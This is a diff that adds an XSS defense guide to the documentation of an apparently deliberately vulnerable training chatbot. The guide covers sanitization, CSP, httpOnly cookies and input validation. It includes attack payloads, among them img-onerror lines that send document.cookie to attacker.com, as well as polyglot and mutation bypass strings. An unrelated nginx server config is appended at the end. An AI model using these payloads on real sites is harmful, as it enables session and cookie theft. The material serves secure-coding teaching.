@@ -580,6 +580,481 @@ fetch(<span class="hljs-string">'/api/comments/1'</span>, { <span class="hljs-at
 <li><strong>Reputation Damage:</strong> Users lose trust when their data is exposed</li>
 <li><strong>Compliance Issues:</strong> GDPR, HIPAA violations if deployed in production</li>
 </ul>
+<hr>
+<h1 id="xss-cross-site-scripting-defense-guide">XSS (Cross-Site Scripting) Defense Guide</h1>
+<h2 id="what-is-xss">What is XSS?</h2>
+<p>XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. This vulnerable chatbot has <strong>two types of XSS</strong>:</p>
+<ol>
+<li><strong>Stored XSS</strong> - Malicious scripts stored in the database (comments board)</li>
+<li><strong>Reflected XSS</strong> - Malicious scripts in chat responses (LLM output)</li>
+</ol>
+<hr>
+<h2 id="current-xss-vulnerabilities">Current XSS Vulnerabilities</h2>
+<h3 id="1-stored-xss-in-comments-commentsjs-line-67">1. Stored XSS in Comments (<code>comments.js</code> line 67)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">// ❌ VULNERABLE CODE:</span>
+commentDiv.innerHTML = <span class="hljs-string">`
+  &lt;div class="comment-header"&gt;
+    &lt;span class="username"&gt;<span class="hljs-subst">${comment.username}</span>&lt;/span&gt;
+    &lt;span class="timestamp"&gt;<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString()}</span>&lt;/span&gt;
+  &lt;/div&gt;
+  &lt;div class="comment-text"&gt;<span class="hljs-subst">${comment.text}</span>&lt;/div&gt;  &lt;!-- XSS HERE! --&gt;
+  &lt;button class="btn btn-sm btn-danger" onclick="deleteComment(<span class="hljs-subst">${comment.id}</span>)"&gt;Delete&lt;/button&gt;
+`</span>;
+</div></code></pre>
+<p><strong>Attack Payload:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('https://attacker.com/exfil?cookie='+document.cookie)"</span>&gt;</span>
+</div></code></pre>
+<h3 id="2-reflected-xss-in-chat-appjs-line-168">2. Reflected XSS in Chat (<code>app.js</code> line 168)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">// ❌ VULNERABLE CODE:</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addMessage</span>(<span class="hljs-params">text, sender</span>) </span>{
+  <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+  textDiv.className = <span class="hljs-string">`message-text <span class="hljs-subst">${sender}</span>`</span>;
+  textDiv.innerHTML = text;  <span class="hljs-comment">// ❌ Should use textContent or DOMPurify!</span>
+  messageDiv.appendChild(textDiv);
+}
+</div></code></pre>
+<p><strong>Attack Payload:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// In chat, send:</span>
+&lt;img src=x onerror=alert(<span class="hljs-built_in">document</span>.cookie)&gt;
+</div></code></pre>
+<hr>
+<h2 id="defense-strategy-multi-layer-approach">Defense Strategy: Multi-Layer Approach</h2>
+<h3 id="layer-1-input-sanitization-server-side-%E2%AD%90-most-important">Layer 1: Input Sanitization (Server-Side) ⭐ MOST IMPORTANT</h3>
+<p><strong>Install DOMPurify for Node.js:</strong></p>
+<pre class="hljs"><code><div>npm install isomorphic-dompurify
+</div></code></pre>
+<p><strong>Update <code>server.js</code> - Sanitize comment input (Line ~460):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// Add at top of file:</span>
+<span class="hljs-keyword">const</span> createDOMPurify = <span class="hljs-built_in">require</span>(<span class="hljs-string">'isomorphic-dompurify'</span>);
+<span class="hljs-keyword">const</span> DOMPurify = createDOMPurify();
+
+<span class="hljs-comment">// ✅ SECURE CODE: Post comment with sanitization</span>
+app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
+  <span class="hljs-keyword">const</span> { text } = req.body;
+  
+  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span>) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment text required'</span> });
+  }
+  
+  <span class="hljs-comment">// ✅ SANITIZE INPUT: Remove all HTML/JavaScript</span>
+  <span class="hljs-keyword">const</span> sanitizedText = DOMPurify.sanitize(text, { 
+    <span class="hljs-attr">ALLOWED_TAGS</span>: [],  <span class="hljs-comment">// No HTML allowed at all</span>
+    <span class="hljs-attr">ALLOWED_ATTR</span>: []
+  });
+  
+  <span class="hljs-keyword">const</span> username = req.session.username || <span class="hljs-string">'Anonymous'</span>;
+  
+  <span class="hljs-keyword">const</span> comment = {
+    <span class="hljs-attr">id</span>: commentIdCounter++,
+    <span class="hljs-attr">username</span>: username,
+    <span class="hljs-attr">text</span>: sanitizedText,  <span class="hljs-comment">// ✅ Store sanitized text</span>
+    <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">Date</span>.now()
+  };
+  
+  mockDB.comments.push(comment);
+  
+  res.json({ 
+    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, 
+    <span class="hljs-attr">comment</span>: comment
+  });
+});
+</div></code></pre>
+<p><strong>Alternative: Strip all HTML tags (simpler):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// Simple regex to remove all HTML tags</span>
+<span class="hljs-keyword">const</span> sanitizedText = text.replace(<span class="hljs-regexp">/&lt;[^&gt;]*&gt;/g</span>, <span class="hljs-string">''</span>);
+</div></code></pre>
+<hr>
+<h3 id="layer-2-output-encoding-frontend">Layer 2: Output Encoding (Frontend)</h3>
+<p><strong>Option A: Use <code>textContent</code> instead of <code>innerHTML</code></strong> (Best for plain text)</p>
+<pre class="hljs"><code><div><span class="hljs-comment">// ✅ SECURE CODE: Use textContent</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addMessage</span>(<span class="hljs-params">text, sender</span>) </span>{
+  <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+  textDiv.className = <span class="hljs-string">`message-text <span class="hljs-subst">${sender}</span>`</span>;
+  textDiv.textContent = text;  <span class="hljs-comment">// ✅ SAFE: Automatically escapes HTML</span>
+  messageDiv.appendChild(textDiv);
+}
+</div></code></pre>
+<p><strong>Option B: Use DOMPurify (Client-Side)</strong> (Best if you need some HTML)</p>
+<pre class="hljs"><code><div><span class="hljs-comment">&lt;!-- Add to index.html and comments.html --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-comment">// ✅ SECURE CODE: DOMPurify in comments.js</span>
+commentDiv.innerHTML = <span class="hljs-string">`
+  &lt;div class="comment-header"&gt;
+    &lt;span class="username"&gt;<span class="hljs-subst">${DOMPurify.sanitize(comment.username)}</span>&lt;/span&gt;
+    &lt;span class="timestamp"&gt;<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString()}</span>&lt;/span&gt;
+  &lt;/div&gt;
+  &lt;div class="comment-text"&gt;<span class="hljs-subst">${DOMPurify.sanitize(comment.text)}</span>&lt;/div&gt;
+  &lt;button class="btn btn-sm btn-danger" onclick="deleteComment(<span class="hljs-subst">${comment.id}</span>)"&gt;Delete&lt;/button&gt;
+`</span>;
+</div></code></pre>
+<hr>
+<h3 id="layer-3-content-security-policy-csp">Layer 3: Content Security Policy (CSP)</h3>
+<p><strong>Add CSP headers in <code>server.js</code> (Line ~20, before routes):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// ✅ SECURE: Content Security Policy</span>
+app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
+  res.setHeader(
+    <span class="hljs-string">'Content-Security-Policy'</span>,
+    <span class="hljs-string">"default-src 'self'; "</span> +
+    <span class="hljs-string">"script-src 'self' https://cdn.jsdelivr.net; "</span> +  <span class="hljs-comment">// Allow DOMPurify CDN</span>
+    <span class="hljs-string">"style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "</span> +  <span class="hljs-comment">// Bootstrap</span>
+    <span class="hljs-string">"img-src 'self' data: https:; "</span> +
+    <span class="hljs-string">"connect-src 'self' https://router.huggingface.co; "</span> +  <span class="hljs-comment">// API calls</span>
+    <span class="hljs-string">"frame-ancestors 'none'; "</span> +
+    <span class="hljs-string">"base-uri 'self'; "</span> +
+    <span class="hljs-string">"form-action 'self'"</span>
+  );
+  
+  <span class="hljs-comment">// Additional security headers</span>
+  res.setHeader(<span class="hljs-string">'X-Content-Type-Options'</span>, <span class="hljs-string">'nosniff'</span>);
+  res.setHeader(<span class="hljs-string">'X-Frame-Options'</span>, <span class="hljs-string">'DENY'</span>);
+  res.setHeader(<span class="hljs-string">'X-XSS-Protection'</span>, <span class="hljs-string">'1; mode=block'</span>);
+  res.setHeader(<span class="hljs-string">'Referrer-Policy'</span>, <span class="hljs-string">'strict-origin-when-cross-origin'</span>);
+  
+  next();
+});
+</div></code></pre>
+<p><strong>What CSP does:</strong></p>
+<ul>
+<li>Blocks inline <code>&lt;script&gt;</code> tags</li>
+<li>Blocks <code>eval()</code> and inline event handlers (<code>onerror</code>, <code>onclick</code> in HTML)</li>
+<li>Only allows scripts from trusted domains</li>
+<li>Prevents XSS even if attacker bypasses sanitization</li>
+</ul>
+<hr>
+<h3 id="layer-4-httponly-cookies-prevents-cookie-theft">Layer 4: HttpOnly Cookies (Prevents Cookie Theft)</h3>
+<p><strong>Update session config in <code>server.js</code> (Line 23):</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// ✅ SECURE: HttpOnly cookies</span>
+app.use(session({
+  <span class="hljs-attr">secret</span>: process.env.SESSION_SECRET || <span class="hljs-string">'change-this-in-production'</span>,  <span class="hljs-comment">// Use env variable</span>
+  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">cookie</span>: {
+    <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// ✅ JavaScript CANNOT access cookies</span>
+    <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// ✅ Only send over HTTPS</span>
+    <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// ✅ CSRF protection</span>
+    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">1</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>  <span class="hljs-comment">// 1 hour (not 24!)</span>
+  }
+}));
+</div></code></pre>
+<p><strong>What this prevents:</strong></p>
+<pre class="hljs"><code><div><span class="hljs-comment">// ❌ This will FAIL if httpOnly: true</span>
+fetch(<span class="hljs-string">'https://attacker.com/?cookie='</span> + <span class="hljs-built_in">document</span>.cookie);  <span class="hljs-comment">// Returns empty string</span>
+</div></code></pre>
+<hr>
+<h3 id="layer-5-input-validation-length--type">Layer 5: Input Validation (Length &amp; Type)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">// ✅ SECURE: Validate input length</span>
+app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
+  <span class="hljs-keyword">const</span> { text } = req.body;
+  
+  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span>) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment text required'</span> });
+  }
+  
+  <span class="hljs-comment">// ✅ Limit length</span>
+  <span class="hljs-keyword">if</span> (text.length &gt; <span class="hljs-number">500</span>) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment too long (max 500 characters)'</span> });
+  }
+  
+  <span class="hljs-comment">// ✅ Check for suspicious patterns</span>
+  <span class="hljs-keyword">const</span> suspiciousPatterns = [
+    <span class="hljs-regexp">/&lt;script/i</span>,
+    /javascript:<span class="hljs-regexp">/i,
+    /</span>on\w+=<span class="hljs-regexp">/i,  /</span><span class="hljs-regexp">/ onclick=, onerror=, etc.
+    /</span>&lt;iframe/i,
+    /&lt;object/i,
+    /&lt;embed/i
+  ];
+  
+  if (suspiciousPatterns.some(pattern =&gt; pattern.test(text))) {
+    return res.status(400).json({ error: 'Invalid content detected' });
+  }
+  
+  // ... continue with sanitization
+});
+</div></code></pre>
+<hr>
+<h2 id="complete-secure-implementation-example">Complete Secure Implementation Example</h2>
+<h3 id="server-side-serverjs">Server-Side (<code>server.js</code>)</h3>
+<pre class="hljs"><code><div><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
+<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express-session'</span>);
+<span class="hljs-keyword">const</span> createDOMPurify = <span class="hljs-built_in">require</span>(<span class="hljs-string">'isomorphic-dompurify'</span>);
+<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">'helmet'</span>);  <span class="hljs-comment">// npm install helmet</span>
+
+<span class="hljs-keyword">const</span> app = express();
+<span class="hljs-keyword">const</span> DOMPurify = createDOMPurify();
+
+<span class="hljs-comment">// ✅ Use Helmet for security headers</span>
+app.use(helmet({
+  <span class="hljs-attr">contentSecurityPolicy</span>: {
+    <span class="hljs-attr">directives</span>: {
+      <span class="hljs-attr">defaultSrc</span>: [<span class="hljs-string">"'self'"</span>],
+      <span class="hljs-attr">scriptSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"https://cdn.jsdelivr.net"</span>],
+      <span class="hljs-attr">styleSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"'unsafe-inline'"</span>, <span class="hljs-string">"https://cdn.jsdelivr.net"</span>],
+      <span class="hljs-attr">imgSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"data:"</span>, <span class="hljs-string">"https:"</span>],
+      <span class="hljs-attr">connectSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"https://router.huggingface.co"</span>],
+      <span class="hljs-attr">frameAncestors</span>: [<span class="hljs-string">"'none'"</span>],
+    },
+  },
+}));
+
+<span class="hljs-comment">// ✅ Secure session</span>
+app.use(session({
+  <span class="hljs-attr">secret</span>: process.env.SESSION_SECRET,
+  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,
+  <span class="hljs-attr">cookie</span>: {
+    <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
+    <span class="hljs-attr">secure</span>: process.env.NODE_ENV === <span class="hljs-string">'production'</span>,
+    <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,
+    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>  <span class="hljs-comment">// 1 hour</span>
+  }
+}));
+
+<span class="hljs-comment">// ✅ Secure comment endpoint</span>
+app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
+  <span class="hljs-keyword">const</span> { text } = req.body;
+  
+  <span class="hljs-comment">// Authentication check</span>
+  <span class="hljs-keyword">if</span> (!req.session.userId) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">401</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Authentication required'</span> });
+  }
+  
+  <span class="hljs-comment">// Validation</span>
+  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span> || text.length &gt; <span class="hljs-number">500</span>) {
+    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Invalid comment'</span> });
+  }
+  
+  <span class="hljs-comment">// Sanitization - remove ALL HTML</span>
+  <span class="hljs-keyword">const</span> sanitizedText = DOMPurify.sanitize(text, {
+    <span class="hljs-attr">ALLOWED_TAGS</span>: [],
+    <span class="hljs-attr">ALLOWED_ATTR</span>: []
+  });
+  
+  <span class="hljs-keyword">const</span> comment = {
+    <span class="hljs-attr">id</span>: commentIdCounter++,
+    <span class="hljs-attr">username</span>: req.session.username,
+    <span class="hljs-attr">text</span>: sanitizedText,
+    <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">Date</span>.now()
+  };
+  
+  mockDB.comments.push(comment);
+  res.json({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, comment });
+});
+</div></code></pre>
+<h3 id="client-side-commentsjs">Client-Side (<code>comments.js</code>)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">// Load comments with safe rendering</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadComments</span>(<span class="hljs-params"></span>) </span>{
+  fetch(<span class="hljs-string">'/api/comments'</span>)
+    .then(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.json())
+    .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
+      <span class="hljs-keyword">const</span> container = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'commentsContainer'</span>);
+      
+      <span class="hljs-keyword">if</span> (!data.comments || data.comments.length === <span class="hljs-number">0</span>) {
+        container.innerHTML = <span class="hljs-string">'&lt;div class="text-center text-muted"&gt;&lt;p&gt;No comments yet.&lt;/p&gt;&lt;/div&gt;'</span>;
+        <span class="hljs-keyword">return</span>;
+      }
+      
+      container.innerHTML = <span class="hljs-string">''</span>;
+      
+      data.comments.forEach(<span class="hljs-function"><span class="hljs-params">comment</span> =&gt;</span> {
+        <span class="hljs-keyword">const</span> commentDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+        commentDiv.className = <span class="hljs-string">'comment-item'</span>;
+        
+        <span class="hljs-comment">// ✅ SECURE: Create elements safely</span>
+        <span class="hljs-keyword">const</span> header = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+        header.className = <span class="hljs-string">'comment-header'</span>;
+        
+        <span class="hljs-keyword">const</span> username = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'span'</span>);
+        username.className = <span class="hljs-string">'username'</span>;
+        username.textContent = comment.username;  <span class="hljs-comment">// ✅ Safe</span>
+        
+        <span class="hljs-keyword">const</span> timestamp = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'span'</span>);
+        timestamp.className = <span class="hljs-string">'timestamp'</span>;
+        timestamp.textContent = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString();
+        
+        header.appendChild(username);
+        header.appendChild(timestamp);
+        
+        <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
+        textDiv.className = <span class="hljs-string">'comment-text'</span>;
+        textDiv.textContent = comment.text;  <span class="hljs-comment">// ✅ Safe - no HTML execution</span>
+        
+        <span class="hljs-keyword">const</span> deleteBtn = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'button'</span>);
+        deleteBtn.className = <span class="hljs-string">'btn btn-sm btn-danger'</span>;
+        deleteBtn.textContent = <span class="hljs-string">'Delete'</span>;
+        deleteBtn.onclick = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> deleteComment(comment.id);  <span class="hljs-comment">// ✅ Safe - JS function, not string</span>
+        
+        commentDiv.appendChild(header);
+        commentDiv.appendChild(textDiv);
+        commentDiv.appendChild(deleteBtn);
+        
+        container.appendChild(commentDiv);
+      });
+    });
+}
+</div></code></pre>
+<hr>
+<h2 id="quick-reference-safe-vs-unsafe">Quick Reference: Safe vs Unsafe</h2>
+<table>
+<thead>
+<tr>
+<th>❌ Unsafe</th>
+<th>✅ Safe</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>element.innerHTML = userInput</code></td>
+<td><code>element.textContent = userInput</code></td>
+<td>textContent escapes HTML</td>
+</tr>
+<tr>
+<td><code>element.innerHTML = data</code></td>
+<td><code>element.innerHTML = DOMPurify.sanitize(data)</code></td>
+<td>DOMPurify removes scripts</td>
+</tr>
+<tr>
+<td>No input validation</td>
+<td>Length + type + pattern checks</td>
+<td>Defense in depth</td>
+</tr>
+<tr>
+<td><code>httpOnly: false</code></td>
+<td><code>httpOnly: true</code></td>
+<td>Prevents cookie theft</td>
+</tr>
+<tr>
+<td>No CSP headers</td>
+<td>CSP with strict policy</td>
+<td>Blocks inline scripts</td>
+</tr>
+<tr>
+<td>Store raw user input</td>
+<td>Sanitize before storing</td>
+<td>Prevent stored XSS</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="testing-your-defenses">Testing Your Defenses</h2>
+<h3 id="test-1-basic-xss">Test 1: Basic XSS</h3>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</div></code></pre>
+<p><strong>Expected:</strong> Should be escaped or blocked</p>
+<h3 id="test-2-event-handler-xss">Test 2: Event Handler XSS</h3>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">XSS</span>')&gt;</span>
+</div></code></pre>
+<p><strong>Expected:</strong> Should be blocked by CSP or sanitized</p>
+<h3 id="test-3-cookie-theft">Test 3: Cookie Theft</h3>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('https://attacker.com/?c='+document.cookie)"</span>&gt;</span>
+</div></code></pre>
+<p><strong>Expected:</strong> httpOnly cookies return empty string</p>
+<h3 id="test-4-dom-clobbering">Test 4: DOM Clobbering</h3>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">userInput</span>&gt;</span>
+</div></code></pre>
+<p><strong>Expected:</strong> Should be sanitized</p>
+<hr>
+<h2 id="red-team-bypass-attempts-for-educational-testing">Red Team Bypass Attempts (For Educational Testing)</h2>
+<p>Even with defenses, attackers try:</p>
+<ol>
+<li><strong>Encoding bypasses:</strong> <code>%3Cscript%3E</code>, <code>&amp;#60;script&amp;#62;</code></li>
+<li><strong>Mutation XSS:</strong> <code>&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></li>
+<li><strong>CSP bypasses:</strong> Using whitelisted CDNs for malicious scripts</li>
+<li><strong>Polyglot payloads:</strong> <code>jaVasCript:/*-/*</code>/<em>`/</em>'/<em>&quot;/**/(/</em> */onerror=alert('XSS') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('XSS')//&gt;\x3e`</li>
+</ol>
+<p><strong>Your defenses should block all of these!</strong></p>
+<pre class="hljs"><code><div><span class="hljs-section">server</span> {
+    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;
+    <span class="hljs-attribute">server_name</span> project-<span class="hljs-number">1</span>-<span class="hljs-number">04</span>.eduhk.hk;
+    <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://<span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;
+}
+
+<span class="hljs-section">server</span> {
+    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;
+    <span class="hljs-attribute">server_name</span> project-<span class="hljs-number">1</span>-<span class="hljs-number">04</span>.eduhk.hk;
+    <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl/dept-wildcard.eduhk/fullchain.crt;
+    <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl/dept-wildcard.eduhk/dept-wildcard.eduhk.hk.key;
+    <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;
+    <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;
+    <span class="hljs-attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;
+    <span class="hljs-attribute">ssl_stapling</span> <span class="hljs-literal">on</span>;
+    <span class="hljs-attribute">ssl_stapling_verify</span> <span class="hljs-literal">on</span>;
+    <span class="hljs-attribute">resolver</span> <span class="hljs-number">8.8.8.8</span> <span class="hljs-number">8.8.4.4</span> valid=<span class="hljs-number">300s</span>;
+    <span class="hljs-attribute">ssl_trusted_certificate</span> /etc/nginx/ssl/dept-wildcard.eduhk/fullchain.crt;
+
+    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">100M</span>;
+
+<span class="hljs-attribute">location</span> /langgraphplayground/ {
+    <span class="hljs-comment"># Don't use rewrite! Let FastAPI handle the full path</span>
+    <span class="hljs-attribute">proxy_pass</span> http://localhost:2024;
+    <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;
+    <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;
+    <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-variable">$connection_upgrade</span>;
+    <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
+    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
+    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
+    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
+    <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>;
+    <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>;
+    <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">300s</span>;
+    <span class="hljs-attribute">proxy_connect_timeout</span> <span class="hljs-number">75s</span>;
+}
+
+
+<span class="hljs-attribute">location</span> /mcp/ {
+        <span class="hljs-comment"># Proxy to Docker container on localhost:8080</span>
+        <span class="hljs-attribute">proxy_pass</span> http://localhost:8080/mcp/;
+
+        <span class="hljs-comment"># Essential for SSE (Server-Sent Events)</span>
+        <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>;           <span class="hljs-comment"># CRITICAL: Must disable buffering for SSE</span>
+        <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>;               <span class="hljs-comment"># Disable caching for real-time streams</span>
+
+        <span class="hljs-comment"># Connection headers</span>
+        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
+        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
+        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
+        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
+
+        <span class="hljs-comment"># SSE-specific headers</span>
+        <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">''</span>;  <span class="hljs-comment"># Keep connection open</span>
+        <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;          <span class="hljs-comment"># Required for SSE</span>
+
+        <span class="hljs-comment"># Timeouts for long-lived connections</span>
+        <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">86400s</span>;       <span class="hljs-comment"># 24 hours</span>
+        <span class="hljs-attribute">proxy_send_timeout</span> <span class="hljs-number">86400s</span>;       <span class="hljs-comment"># 24 hours</span>
+
+        <span class="hljs-comment"># Disable compression for SSE</span>
+        <span class="hljs-attribute">gzip</span> <span class="hljs-literal">off</span>;
+
+        <span class="hljs-comment"># CORS headers (if Inspector is accessed from different domain)</span>
+        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Origin'</span> <span class="hljs-string">'*'</span> always;
+        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Methods'</span> <span class="hljs-string">'GET, POST, OPTIONS'</span> always;
+        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Headers'</span> <span class="hljs-string">'Content-Type, Accept'</span> always;
+
+        <span class="hljs-comment"># Handle OPTIONS preflight requests</span>
+        <span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_method</span> = <span class="hljs-string">'OPTIONS'</span>) {
+            <span class="hljs-attribute">return</span> <span class="hljs-number">204</span>;
+        }
+    }
+
+
+
+<span class="hljs-attribute">location</span> / {
+<span class="hljs-attribute">proxy_pass</span> http://localhost:3000;
+<span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
+<span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
